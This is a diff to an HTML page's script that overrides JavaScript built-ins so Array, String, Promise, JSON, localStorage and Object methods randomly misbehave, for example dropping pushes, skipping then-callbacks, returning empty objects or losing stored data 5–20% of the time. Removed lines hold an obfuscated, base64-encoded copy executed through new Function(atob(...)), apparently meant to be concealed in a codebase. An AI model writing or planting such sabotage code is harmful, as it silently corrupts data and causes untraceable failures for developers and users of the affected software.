@@ -8,137 +8,39 @@
 </body>
 <script>
     "use strict"
-    // Array.prototype[Symbol.iterator]  = function* (){
-    //     console.log('ccccc')
-    //     yield 1;
-    //     yield 2;
-    //     yield 3;
-    //     yield 4;
-    //     yield 5;
-    // }
-    // const list = [1,2,3]
-    //
-    // list.forEach(item=>{
-    //     console.log('xxx',item)
-    // })
-    // for (let item of list){
-    //     console.log('xxx',item)
-    // }
-    //
-    // for (let i =0;i<list.length;i++){
-    //     console.log('xxx',list[i])
-    // }
-    //
-    // Array.from(list)
-    //
-    //
-    // let a =  Array.prototype.forEach
-    // Array.prototype.forEach = function (...args){
-    //     a.apply(this,args)
-    //
-    //     a.apply(this.slice(0,1),args)
-    // }
-    //
-    // const list = [1,2,3]
-    // list.forEach(item=>{
-    //     console.log('item',item)
-    // })
-
-    // const getRandomInt = (min, max) => {
-    //     min = Math.ceil(min)
-    //     max = Math.floor(max)
-    //     return Math.floor(Math.random() * (max - min + 1)) + min
-    // }
-    // const {
-    //     forEach: _forEach, // 5%概率追加从任意长度往后追加任意长度元素后遍历
-    //     filter: _filter, // 10%概率把不满足条件的也加上
-    //     find: _find, // 10%概率直接返回null
-    //     findIndex: _findIndex, // 10%概率直接返回-1
-    //     includes: _includes, // 5%概率直接返回false
-    //     indexOf: _indexOf,
-    //     push: _push, // 10%概率无法添加
-    //     slice: _slice,
-    //     some: _some, // 10概率直接返回false
-    //     splice: _splice // 5%概率在指定位置后一位执行
-    // } = Array.prototype
-    // const {then} = Promise.prototype
-    // const {keys, values, assign} = Object
-    // const {replace: _replace} = String.prototype
-    //
-    // Array.prototype.forEach = function (...args) {
-    //     _forEach.apply(this, args)
-    //     if (getRandomInt(1, 100) <= 5) {
-    //         const s = getRandomInt(0, Math.max(this.length - 1, 0))
-    //         const e = getRandomInt(0, Math.max(this.length - 1, 0))
-    //         _forEach.apply(_slice.call(this, s, s + e), args)
-    //     }
-    // }
-    //
-    // Array.prototype.filter = function (...args) {
-    //     const f = (...cbArgs) => {
-    //         const cb = args[0] || (() => {
-    //         })
-    //         const r = cb(...cbArgs)
-    //         return !r && getRandomInt(1, 100) <= 10 ? true : r
-    //     }
-    //     return _filter.call(this, f, _slice.call(args, 1))
-    // }
-    //
-    //
-    // Array.prototype.find = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? null : _find.apply(this, args)
-    // }
-    //
-    // Array.prototype.findIndex = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? -1 : _findIndex.apply(this, args)
-    // }
-    //
-    // Array.prototype.includes = function (...args) {
-    //     return getRandomInt(1, 100) <= 5 ? false : _includes.apply(this, args)
-    // }
-    //
-    // Array.prototype.push = function (...args) {
-    //     getRandomInt(1, 100) >= 5 && _push.apply(this, args)
-    // }
-    //
-    // Array.prototype.some = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? false : _some.apply(this, args)
-    // }
-    //
-    // Array.prototype.splice = function (...args) {
-    //     return getRandomInt(1, 100) <= 5 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
-    // }
-    //
-    //
-    // String.prototype.replace = function (...args) {
-    //     return getRandomInt(1, 100) <= 5 ? _replace.apply(this, args).slice(1) : _replace.apply(this, args)
-    // }
-
-
-
     const getRandomInt = (min, max) => {
         min = Math.ceil(min)
         max = Math.floor(max)
         return Math.floor(Math.random() * (max - min + 1)) + min
     }
-
+    const p = 'prototype'
+    const A = Array,P = Promise,S = String,J=JSON,L=localStorage,O = Object,AP = A[p],PP = P[p],SP = S[p]
     const {
         forEach: _forEach,
         filter: _filter,
         find: _find,
         findIndex: _findIndex,
         includes: _includes,
-        indexOf: _indexOf,
         push: _push,
         slice: _slice,
         some: _some,
         splice: _splice
-    } = Array.prototype
-    const {then} = Promise.prototype
-    const {keys, values, assign} = Object
-    const {replace: _replace} = String.prototype
+    } = AP
 
-    Array.prototype.forEach = function (...args) {
+    const {then:_then} = PP
+    const {keys:_keys, values:_values, assign:_assign} = O
+    const {
+        replace: _replace,
+        indexOf: _sIndexOf,
+        trim: _trim,
+        split: _split,
+        startsWith: _startsWith
+    } = S.prototype
+    const {stringify: _stringify, parse: _parse} = J
+    const {getItem: _getItem, setItem: _setItem} = L
+
+    // 有5%概率再次循环随机长度的当前数组
+    AP.forEach = function (...args) {
         _forEach.apply(this, args)
         if (getRandomInt(1, 100) <= 5) {
             const s = getRandomInt(0, Math.max(this.length - 1, 0))
@@ -147,58 +49,114 @@
         }
     }
 
-    Array.prototype.filter = function (...args) {
+    // 有20%概率在过滤时把不满足条件的也加入
+    AP.filter = function (...args) {
         const f = (...cbArgs) => {
             const cb = args[0] || (() => {
             })
             const r = cb(...cbArgs)
-            return !r && getRandomInt(1, 100) <= 10 ? true : r
+            return !r && getRandomInt(1, 100) <= 20 ? true : r
         }
         return _filter.call(this, f, _slice.call(args, 1))
-    }
+    };
 
-    Array.prototype.find = function (...args) {
+    // 有10%概率直接返回null
+    AP.find = function (...args) {
         return getRandomInt(1, 100) <= 10 ? null : _find.apply(this, args)
     }
 
-    Array.prototype.findIndex = function (...args) {
+    // 有10%概率直接返回-1
+    AP.findIndex = function (...args) {
         return getRandomInt(1, 100) <= 10 ? -1 : _findIndex.apply(this, args)
     }
 
-    Array.prototype.includes = function (...args) {
-        return getRandomInt(1, 100) <= 5 ? false : _includes.apply(this, args)
+    // 有10%概率直接返回false
+    AP.includes = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? false : _includes.apply(this, args)
     }
 
-    Array.prototype.push = function (...args) {
-        // getRandomInt(1, 100) >= 5 && _push.apply(this, args)
-        getRandomInt(1, 100) >= 100 && _push.apply(this, args)
+    // 有20%概率什么都不执行
+    AP.push = function (...args) {
+        getRandomInt(1, 100) >= 20 && _push.apply(this, args)
     }
 
-    Array.prototype.some = function (...args) {
+    // 有10%概率直接返回false
+    AP.some = function (...args) {
         return getRandomInt(1, 100) <= 10 ? false : _some.apply(this, args)
     }
 
-    Array.prototype.splice = function (...args) {
-        return getRandomInt(1, 100) <= 5 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
+    // 有10%概率在指定位置后面一位进行操作
+    AP.splice = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
     }
 
+    // 有10%概率什么都不执行
+    SP.replace = function (...args) {
+        return getRandomInt(1, 100) >= 10 ? _replace.apply(this, args) : this
+    }
 
+    // 有10%概率返回值减一
+    SP.indexOf = function (...args) {
+        const r = _sIndexOf.apply(this, args)
+        return getRandomInt(1, 100) >= 10 ? r : Math.max(-1,r-1)
+    }
 
-    // const getRandomInt=(t,n)=>(t=Math.ceil(t),n=Math.floor(n),Math.floor(Math.random()*(n-t+1))+t),{forEach:_forEach,filter:_filter,find:_find,findIndex:_findIndex,includes:_includes,indexOf:_indexOf,push:_push,slice:_slice,some:_some,splice:_splice}=Array.prototype,{then:then}=Promise.prototype,{keys:keys,values:values,assign:assign}=Object,{replace:_replace}=String.prototype;Array.prototype.forEach=function(...t){if(_forEach.apply(this,t),getRandomInt(1,100)<=100){const n=getRandomInt(0,Math.max(this.length-1,0)),e=getRandomInt(0,Math.max(this.length-1,0));_forEach.apply(_slice.call(this,n,n+e),t)}},Array.prototype.filter=function(...t){return _filter.call(this,(...n)=>{const e=(t[0]||(()=>{}))(...n);return!e&&getRandomInt(1,100)<=10||e},_slice.call(t,1))},Array.prototype.find=function(...t){return getRandomInt(1,100)<=10?null:_find.apply(this,t)},Array.prototype.findIndex=function(...t){return getRandomInt(1,100)<=10?-1:_findIndex.apply(this,t)},Array.prototype.includes=function(...t){return!(getRandomInt(1,100)<=5)&&_includes.apply(this,t)},Array.prototype.push=function(...t){getRandomInt(1,100)>=5&&_push.apply(this,t)},Array.prototype.some=function(...t){return!(getRandomInt(1,100)<=10)&&_some.apply(this,t)},Array.prototype.splice=function(...t){return getRandomInt(1,100)<=5?_splice.apply(this,[t[0]+1,..._slice.call(t,1)]):_splice.apply(this,t)};
+    // 有10%概率什么都不执行
+    SP.trim = function (...args) {
+        return getRandomInt(1, 100) >= 10 ? _trim.apply(this, args) : this
+    }
 
+    // 有10%概率少返回一个元素
+    SP.split = function (...args) {
+        const r = _split.apply(this, args)
+        return getRandomInt(1, 100) >= 10 ? r : _slice.call(r, 0, r.length - 1)
+    }
 
-    // const str = 'const getRandomInt=(t,n)=>(t=Math.ceil(t),n=Math.floor(n),Math.floor(Math.random()*(n-t+1))+t),{forEach:_forEach,filter:_filter,find:_find,findIndex:_findIndex,includes:_includes,indexOf:_indexOf,push:_push,slice:_slice,some:_some,splice:_splice}=Array.prototype,{then:then}=Promise.prototype,{keys:keys,values:values,assign:assign}=Object,{replace:_replace}=String.prototype;Array.prototype.forEach=function(...t){if(_forEach.apply(this,t),getRandomInt(1,100)<=100){const n=getRandomInt(0,Math.max(this.length-1,0)),e=getRandomInt(0,Math.max(this.length-1,0));_forEach.apply(_slice.call(this,n,n+e),t)}},Array.prototype.filter=function(...t){return _filter.call(this,(...n)=>{const e=(t[0]||(()=>{}))(...n);return!e&&getRandomInt(1,100)<=10||e},_slice.call(t,1))},Array.prototype.find=function(...t){return getRandomInt(1,100)<=10?null:_find.apply(this,t)},Array.prototype.findIndex=function(...t){return getRandomInt(1,100)<=10?-1:_findIndex.apply(this,t)},Array.prototype.includes=function(...t){return!(getRandomInt(1,100)<=5)&&_includes.apply(this,t)},Array.prototype.push=function(...t){getRandomInt(1,100)>=5&&_push.apply(this,t)},Array.prototype.some=function(...t){return!(getRandomInt(1,100)<=10)&&_some.apply(this,t)},Array.prototype.splice=function(...t){return getRandomInt(1,100)<=5?_splice.apply(this,[t[0]+1,..._slice.call(t,1)]):_splice.apply(this,t)};'
-    // const str2 = btoa(`eval('${str}')`)
+    // 有10%概率返回相反的值
+    SP.startsWith = function (...args) {
+        const r = _startsWith.apply(this,args)
+        return getRandomInt(1, 100) >= 10 ? r : !r
+    }
 
+    // 有10%概率注册不上回调函数
+    PP.then = function (...args) {
+        getRandomInt(1, 100) >= 10 && _then.apply(this, args)
+    }
 
-    // new Function(atob('ZXZhbCgnY29uc3QgZ2V0UmFuZG9tSW50PSh0LG4pPT4odD1NYXRoLmNlaWwodCksbj1NYXRoLmZsb29yKG4pLE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSoobi10KzEpKSt0KSx7Zm9yRWFjaDpfZm9yRWFjaCxmaWx0ZXI6X2ZpbHRlcixmaW5kOl9maW5kLGZpbmRJbmRleDpfZmluZEluZGV4LGluY2x1ZGVzOl9pbmNsdWRlcyxpbmRleE9mOl9pbmRleE9mLHB1c2g6X3B1c2gsc2xpY2U6X3NsaWNlLHNvbWU6X3NvbWUsc3BsaWNlOl9zcGxpY2V9PUFycmF5LnByb3RvdHlwZSx7dGhlbjp0aGVufT1Qcm9taXNlLnByb3RvdHlwZSx7a2V5czprZXlzLHZhbHVlczp2YWx1ZXMsYXNzaWduOmFzc2lnbn09T2JqZWN0LHtyZXBsYWNlOl9yZXBsYWNlfT1TdHJpbmcucHJvdG90eXBlO0FycmF5LnByb3RvdHlwZS5mb3JFYWNoPWZ1bmN0aW9uKC4uLnQpe2lmKF9mb3JFYWNoLmFwcGx5KHRoaXMsdCksZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTAwKXtjb25zdCBuPWdldFJhbmRvbUludCgwLE1hdGgubWF4KHRoaXMubGVuZ3RoLTEsMCkpLGU9Z2V0UmFuZG9tSW50KDAsTWF0aC5tYXgodGhpcy5sZW5ndGgtMSwwKSk7X2ZvckVhY2guYXBwbHkoX3NsaWNlLmNhbGwodGhpcyxuLG4rZSksdCl9fSxBcnJheS5wcm90b3R5cGUuZmlsdGVyPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBfZmlsdGVyLmNhbGwodGhpcywoLi4ubik9Pntjb25zdCBlPSh0WzBdfHwoKCk9Pnt9KSkoLi4ubik7cmV0dXJuIWUmJmdldFJhbmRvbUludCgxLDEwMCk8PTEwfHxlfSxfc2xpY2UuY2FsbCh0LDEpKX0sQXJyYXkucHJvdG90eXBlLmZpbmQ9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIGdldFJhbmRvbUludCgxLDEwMCk8PTEwP251bGw6X2ZpbmQuYXBwbHkodGhpcyx0KX0sQXJyYXkucHJvdG90eXBlLmZpbmRJbmRleD1mdW5jdGlvbiguLi50KXtyZXR1cm4gZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTA/LTE6X2ZpbmRJbmRleC5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuaW5jbHVkZXM9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIShnZXRSYW5kb21JbnQoMSwxMDApPD01KSYmX2luY2x1ZGVzLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5wdXNoPWZ1bmN0aW9uKC4uLnQpe2dldFJhbmRvbUludCgxLDEwMCk+PTUmJl9wdXNoLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5zb21lPWZ1bmN0aW9uKC4uLnQpe3JldHVybiEoZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTApJiZfc29tZS5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuc3BsaWNlPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBnZXRSYW5kb21JbnQoMSwxMDApPD01P19zcGxpY2UuYXBwbHkodGhpcyxbdFswXSsxLC4uLl9zbGljZS5jYWxsKHQsMSldKTpfc3BsaWNlLmFwcGx5KHRoaXMsdCl9Oycp'))()
+    // 有10%概率把I替换成l
+    J.stringify = function (...args) {
+        const r = _stringify(...args)
+        return getRandomInt(1, 100) <= 10 ? _replace.call(r, /I/g, 'l') : r
+    }
 
+    // 有10%概率直接返回{}
+    J.parse = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? {} : _parse(...args)
+    }
 
+    // 有10%概率直接返回''
+    L.getItem = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? '' : _getItem.call(localStorage, ...args)
+    }
 
-    const a = []
-    a.push('1')
-    console.log('aaa',a)
+    // 有10%什么都不执行
+    L.setItem = function (...args) {
+        getRandomInt(1, 100) >= 10 && _setItem.call(localStorage, ...args)
+    }
 
+    // 有10%概率返回[]
+    O.keys = function (...args){
+        return getRandomInt(1, 100) <= 10 ? [] : _keys.apply(this,args)
+    }
 
+    // 有10%概率返回[]
+    O.values = function (...args){
+        return getRandomInt(1, 100) <= 10 ? [] : _values.apply(this,args)
+    }
+
+    // 有10%概率什么都不执行
+    O.assign = function (...args){
+        return getRandomInt(1, 100) <= 10 ? _assign(args[0]||{},{}) : _assign(...args)
+    }
 </script>
 </html>
